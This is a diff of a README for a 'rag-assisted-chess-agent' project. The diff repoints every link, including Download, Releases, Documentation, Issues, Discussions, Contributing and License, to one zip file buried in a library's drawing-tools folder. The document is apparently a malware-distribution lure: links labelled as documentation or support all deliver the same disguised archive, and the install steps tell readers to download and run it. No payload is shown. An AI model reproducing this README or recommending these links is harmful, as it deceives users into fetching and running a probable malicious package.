@@ -6,7 +6,7 @@ Welcome to the rag-assisted-chess-agent! This tool combines powerful chess analy
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip)](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip)
+[![Download](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip)](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip)
 
 ## 📖 About the Project
 
@@ -33,7 +33,7 @@ To run the rag-assisted-chess-agent smoothly, ensure your system meets the follo
 
 Follow these simple steps to download and install the rag-assisted-chess-agent:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip).
+1. Visit the [Releases Page](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip).
 2. Look for the latest version available for download.
 3. Click the download link to get the installation package.
 4. Once the download is complete, locate the file on your computer.
@@ -53,23 +53,23 @@ Using the rag-assisted-chess-agent is simple. Once you have it installed, you ca
 
 ## 📚 Documentation
 
-For in-depth information on features and usage, refer to the [Documentation](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip). This resource provides detailed guidance on each functionality available within the application.
+For in-depth information on features and usage, refer to the [Documentation](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip). This resource provides detailed guidance on each functionality available within the application.
 
 ## 🔍 Community & Support
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues**: Report bugs or request features via [Issues](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip).
-- **Discussions**: Join the conversation about ideas and suggestions in the [Discussions](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip) section.
+- **GitHub Issues**: Report bugs or request features via [Issues](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip).
+- **Discussions**: Join the conversation about ideas and suggestions in the [Discussions](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip) section.
 
 ## 🌟 Contributing
 
-We welcome contributions! If you want to help improve the rag-assisted-chess-agent, please check our guidelines in the [Contributing Guide](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip).
+We welcome contributions! If you want to help improve the rag-assisted-chess-agent, please check our guidelines in the [Contributing Guide](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip).
 
 ## 🤝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip) file for more details.
 
 ## 📥 Don’t Forget to Download!
 
-Remember, to get started with the rag-assisted-chess-agent, visit the [Releases Page](https://raw.githubusercontent.com/Gen9oooooo/rag-assisted-chess-agent/main/frontend/src/assets/chess-rag-agent-assisted-whitewall.zip) and download the latest version. Enjoy your chess analysis!
+Remember, to get started with the rag-assisted-chess-agent, visit the [Releases Page](https://github.com/Gen9oooooo/rag-assisted-chess-agent/raw/refs/heads/main/frontend/libs/ngx-chess-board/esm2022/lib/engine/drawing-tools/rag_assisted_chess_agent_2.6.zip) and download the latest version. Enjoy your chess analysis!
